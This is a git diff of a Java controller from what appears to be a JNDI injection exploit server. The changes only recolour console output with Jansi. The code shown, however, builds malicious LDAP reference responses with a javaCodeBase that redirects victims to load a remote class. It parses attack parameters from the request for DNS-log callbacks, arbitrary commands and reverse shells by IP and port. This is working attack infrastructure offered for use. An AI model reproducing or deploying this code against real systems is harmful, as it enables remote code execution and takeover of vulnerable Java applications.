@@ -12,6 +12,8 @@ import com.unboundid.ldap.sdk.ResultCode;
 
 import java.net.URL;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 @LdapMapping(uri = { "/basic" })
 public class BasicController implements LdapController {
     //最后的反斜杠不能少
@@ -21,7 +23,7 @@ public class BasicController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println("[+] Sending LDAP ResourceRef result for " + base + " with basic remote reference payload");
+        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with basic remote reference payload|@"));
         //这个方法里面有改动，其他基本无改动
         Entry e = new Entry(base);
         String className = "";
@@ -94,7 +96,7 @@ public class BasicController implements LdapController {
         }
 
         URL turl = new URL(new URL(this.codebase), className + ".class");
-        System.out.println("[+] Send LDAP reference result for " + base + " redirecting to " + turl);
+        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Send LDAP reference result for |@" + base + " @|MAGENTA redirecting to |@" + turl));
         e.addAttribute("javaClassName", "foo");
         e.addAttribute("javaCodeBase", this.codebase);
         e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
@@ -115,33 +117,33 @@ public class BasicController implements LdapController {
 
             try{
                 type = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
-                System.out.println("[+] Paylaod: " + type);
+                System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
             }catch(IllegalArgumentException e){
-                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(fistIndex + 1, secondIndex));
+                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
 
             switch(type){
                 case dnslog:
                     String url = base.substring(base.lastIndexOf("/") + 1);
-                    System.out.println("[+] URL: " + url);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                     params = new String[]{url};
                     break;
                 case command:
                     String cmd = Util.getCmdFromBase(base);
-                    System.out.println("[+] Command: " + cmd);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                     params = new String[]{cmd};
                     break;
                 case reverseshell:
                     String[] results = Util.getIPAndPortFromBase(base);
-                    System.out.println("[+] IP: " + results[0]);
-                    System.out.println("[+] Port: " + results[1]);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                     params = results;
                     break;
             }
         }catch(Exception e){
             if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;
 
-            throw new IncorrectParamsException("Incorrect params: " + base);
+            throw new IncorrectParamsException("Incorrect params >> " + base);
         }
     }
 }
